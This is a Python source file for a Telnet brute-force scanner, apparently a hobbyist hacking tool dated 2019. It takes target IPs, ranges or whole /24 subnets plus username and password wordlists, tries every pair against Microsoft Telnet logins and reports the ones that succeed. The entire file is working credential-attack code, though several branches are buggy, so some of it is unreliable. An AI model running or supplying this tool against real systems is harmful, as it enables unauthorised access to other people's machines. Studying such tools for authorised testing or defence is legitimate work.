import telnetlib
import argparse
import time
import io


ips = [] #存储要扫描的目标IP
port = None #默认端口设置为23
Usernames = [] #存储爆破的用户名 
Passwords = [] #存储爆破的密码
ip_net = None #默认存储IP地址所属网段
show_info =''
logo = '\033[1;36m'+'''
    TTTTTTTTTTTTT   EEEEEEEEEEEEEE   LLL               NNNN         NNN   EEEEEEEEEEEEEE   TTTTTTTTTTTTT    
       TTTTTTT      EEE              LLL               NNN NNN      NNN   EEE                TTTTTTTTT
         TTT        EEE              LLL               NNN   NNN    NNN   EEE                   TTT
         TTT        EEEEEEEEEEEEEE   LLL               NNN     NNN  NNN   EEEEEEEEEEEEEE        TTT 
         TTT        EEE              LLL               NNN       NN NNN   EEE                   TTT        
         TTT        EEE              LLLL              NNN         NNNN   EEE                   TTT
         TTT        EEEEEEEEEEEEEE   LLLLLLLLLLLLLLL   NNN          NNN   EEEEEEEEEEEEEE        TTT    
         
                                                                                        By Sccc--KaliYang
                                                                                        version 1.0 
                                                                                        2019/12/30'''
def init():
    print(logo)
def CheckIP(host_ip):
    try:
        ip_net = str(host_ip).split('.')[0] +'.'+ str(host_ip).split('.')[1] +'.'+ str(host_ip).split('.')[2]  
        if ip_net is not None:
            return True  
    except:
        ip_net = None
        return False    
def telnet_login(ip,port=23):
    for username in Usernames:
        user =username.rstrip()
        for password in Passwords:   
            pwd = password.rstrip()               
            telnet = telnetlib.Telnet(host=ip,port=port,timeout=1)                          
            telnet.set_debuglevel(0) 
            data = telnet.read_until(b"\n") #Welcome Telnet Server
            if 'Microsoft' in data.decode(errors='ignore'):
                data = telnet.read_until(b"login")#login账户
                show_info = data.decode(errors='ignore')#获取内容为 login                              
                telnet.write(user.encode("ascii")+b'\r\n')
                data = telnet.read_until(b"password") #密码
                show_info = show_info + data.decode(errors='ignore')
                print(show_info+": "+pwd)           
                telnet.write(pwd.encode("ascii") +b'\r\n')  
                while True:
                    result = telnet.read_until(b'\r\n')       
                    if b'Login Failed' in result or b'incorrect' in result :
                        print("[-] Checking for Username: "+user+" Password: "+pwd+" failed")
                        telnet.write(b'exit\n')
                        break
                    elif b'=' in result:
                        print("[+] Success login for Username: "+user+" Password: "+pwd)
                        telnet.write(b'exit\n')
                        break
                    else:
                        continue
                telnet.close()   
            else:
                exit(0) #Linux   
def main():
    parser = argparse.ArgumentParser(description='Telnet Scanner')
    parser.add_argument('-I',dest='ip',help='\033[1;33m The target ip list with "," or "-" or "/24" space')
    parser.add_argument('-P',dest='Port',help='\033[1;33m The target ip with port ')
    parser.add_argument('-fu',dest='UserlistFile',help='\033[1;33m Username dictionadry file')
    parser.add_argument('-fp',dest='pwdlistFile',help='\033[1;33m Password dictionadry file')
    args = None 
    try:
        args = parser.parse_args()
        if args.ip == None:
            exit(0)       
    except:
        print(parser.parse_args(['-h']))
        exit(0)    
    if ',' in str(args.ip):
        if(CheckIP(str(args.ip))):
            ip_collent = str(args.ip).split(',')
            for ip in ip_collent:
                ips.append(ip_collent)
        else:
            print('this target ip format is False')
            exit(0)
    elif '-' in str(args.ip):        
        if(CheckIP(str(args.ip))):
            ip_net = str(args.ip).split('-')[0].split('.')[0] + '.' + str(args.ip).split('-')[0].split('.')[1]+ '.' + str(args.ip).split('-')[0].split('.')[2] 
            start_ip = str(args.ip).split('-')[0].split('.')[3]
            end_ip = str(args.ip).split('-')[1].split('.')[3]
            for ip in range(int(start_ip),int(end_ip)+1):  
                ip = ip_net + '.' + str(ip)                          
        else:
            print('this target ip format is False')
            exit(0)
    elif '/24' in str(args.ip):
        if(CheckIP(str(args.ip))):
            ip_net = str(args.ip).split('.')[0] + '.' + str(args.ip).split('.')[1]+ '.' + str(args.ip).split('.')[2]    
            for ip in range(1,255):  
                ip = ip_net + '.' + str(ip)             
                ips.append(ip)
        else:
            print('this target ip format is False')
            exit(0)
    else:
        if(CheckIP(str(args.ip))):
            ip_collent = str(args.ip)
            ips.append(ip_collent)
        else:
            print('this target ip format is False')
            exit(0)
    try:
        UsernameFile = open(args.UserlistFile,'r')
        UserList = UsernameFile.readlines()
        for User in UserList:
            Usernames.append(str(User))
        UsernameFile.close()
        PasswordFile = open(args.pwdlistFile,'r')
        PwdList = PasswordFile.readlines()
        for Pwd in PwdList:
            Passwords.append(str(Pwd))
        PasswordFile.close()
    except:
        print('\033[1;36m'+parser.parse_args(['-h']))
        exit(0)
    if ips == ['None']:
        print('\033[1;36m'+parser.parse_args(['-h']))
        exit(0)
    else:
        print(ips)
        for ip in ips:
            if Passwords != None and Usernames!= None:
                try:
                    port = args.Port
                except:
                    port = 23
                telnet_login(ip,port)
            else:
                print('\033[1;36m'+parser.parse_args(['-h']))
                exit(0)
        print ('\n[*]------------------------Scan End!------------------------[*]')
                      
if __name__ == "__main__":
    init()
    main()